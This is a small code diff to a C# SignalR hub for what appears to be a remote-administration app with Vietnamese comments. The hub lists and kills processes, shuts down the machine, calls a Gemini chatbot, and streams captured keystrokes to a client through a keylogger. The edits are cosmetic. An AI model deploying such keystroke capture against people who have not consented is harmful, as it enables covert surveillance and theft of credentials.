@@ -31,6 +31,7 @@ namespace Server.Hubs
             _inputService = inputService;
             _hubContext = hubContext;
             _configuration = configuration;
+
         }
 
         // --- NHÓM 1: HỆ THỐNG (LIST, START, KILL, SHUTDOWN) ---
@@ -39,7 +40,7 @@ namespace Server.Hubs
         {
             var list = _systemService.ListProcessOrApp(isAppOnly);
             // Gửi kết quả về cho người gọi (Caller)
-            string json = JsonHelper.ToJson(list); // Giả sử bạn đã có JsonHelper
+            string json = JsonHelper.ToJson(list);
             await Clients.Caller.SendAsync("ReceiveProcessList", json);
         }
 
@@ -105,7 +106,6 @@ namespace Server.Hubs
             // Bắt đầu lắng nghe và gửi từng phím về Client
             _inputService.StartKeyLogger(async (keyData) => 
             {
-                // Lưu ý: Dùng _hubContext để gửi từ luồng background
                 await _hubContext.Clients.Client(connectionId).SendAsync("ReceiveKeyLog", keyData);
             });
 
@@ -141,7 +141,7 @@ namespace Server.Hubs
                    - Tab POWER: Tắt máy (Shutdown) hoặc Khởi động lại (Restart).
                 
                 HƯỚNG DẪN KẾT NỐI:
-                - Nhập IP của máy Server vào ô trên cùng bên phải.
+                - Nhập  IP của máy Server vào ô trên cùng bên phải.
                 - Bấm nút 'Kết nối'. Nếu thành công, đèn sẽ chuyển xanh.
                 
                 LƯU Ý AN TOÀN:
@@ -152,7 +152,7 @@ namespace Server.Hubs
             {
                 try 
                 {
-                    string apiUrl = $"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={apiKey}";
+                    string apiUrl = $"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key={apiKey}";
                     
                         string finalPrompt = $"{projectInfo}\n\nCâu hỏi của người dùng: {message}";
 
@@ -167,7 +167,7 @@ namespace Server.Hubs
                     using (var httpClient = new HttpClient())
                     {
                         var jsonContent = new StringContent(
-                            JsonSerializer.Serialize(requestData), 
+                            JsonHelper.ToJson(requestData), 
                             Encoding.UTF8, 
                             "application/json");
                         
